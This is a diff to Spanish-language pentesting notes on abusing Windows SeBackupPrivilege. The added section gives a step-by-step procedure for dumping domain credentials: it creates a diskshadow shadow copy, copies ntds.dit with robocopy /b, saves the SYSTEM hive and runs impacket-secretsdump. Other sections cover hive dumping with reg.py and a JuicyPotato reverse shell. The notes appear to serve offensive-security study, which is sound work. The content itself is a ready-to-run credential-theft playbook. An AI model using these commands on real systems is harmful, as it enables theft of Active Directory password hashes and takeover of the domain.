@@ -213,6 +213,7 @@ PASOS con 'JuicyPotato' para ejecuta una Reverse Shell:
 
 
 ## SeBackupPrivilege y SeRestorePrivilege
+* [SeBackupPrivilege](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/)
 ```powershell 
 Son privilegios de Windows relacionados con las operaciones de Backup y Restore.
 
@@ -261,12 +262,43 @@ Pasos:
 # Descargar los archivos desde Evil-WinRM a Kali
 
 ❯ impacket-secretsdump -sam sam.hive -system system.hive LOCAL   
-# Dumpear los hashes de los usuarios desde Kali con los archivos obtenidos  
+# Dumpear los hashes de los usuarios desde Kali con los archivos obtenidos 
 
+ 
+++++++++++++++++++++++++++++++++++
+
+## FORMA 2: Shadow Copy & ntds.dit Extraction
+
+Paso 1: Desde Kali
+❯ nano raj.dsh
+
+	set context persistent nowriters
+	add volume c: alias raj
+	create
+	expose %raj% z:
+	
+❯ unix2dos raj.dsh   # Convertir el archivo .dsh a formato DOS
+
+Paso 2: En la máquina víctima ejecutar 
+❯ diskshadow /s raj.dsh
+❯ robocopy /b z:\windows\ntds . ntds.dit   # Copiar el ntds 
+❯ reg save hklm\system C:\Temp\system      # hacer copia del system 
+
+Paso 3: Desde Kali 
+❯ impacket-secretsdump -ntds ntds.dit -system system local
 
 ++++++++++++++++++++++++++++++++++
 
-## FORMA 2: Se puede utilizar una herramienta como `reg.py` para realizar un backup remoto de las hives del Registry.
+## FORMA 3: En un Domain Controller, NTDS.dit contiene la base de datos de Active Directory.
+Pasos:
+
+# Si se tiene el NTDS, SYSTEM, SECURITY se puede extraer de la siguiente forma. 
+❯ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL   
+❯ impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
+
+++++++++++++++++++++++++++++++++++
+
+## FORMA 4: Se puede utilizar una herramienta como `reg.py` para realizar un backup remoto de las hives del Registry.
 Pasos:
 # Descargar la tool 
 ❯ https://github.com/horizon3ai/backup_dc_registry/blob/main/reg.py    
@@ -285,15 +317,6 @@ Pasos:
 Notas:
 	1. Crear el recuros compartido antes de ejecutar la herramineta 'reg.py'
 	2. La ejecución de la herramienta 'reg.py' y el comando de 'impacket-smbserver' deben de ser en el mismo directorio en Kali para evitar un error 
-
-++++++++++++++++++++++++++++++++++
-
-## FORMA 3: En un Domain Controller, NTDS.dit contiene la base de datos de Active Directory.
-Pasos:
-
-# Si se tiene el NTDS, SYSTEM, SECURITY se puede extraer de la siguiente forma. 
-❯ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL   
-❯ impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
 ```
 
 ```bash 
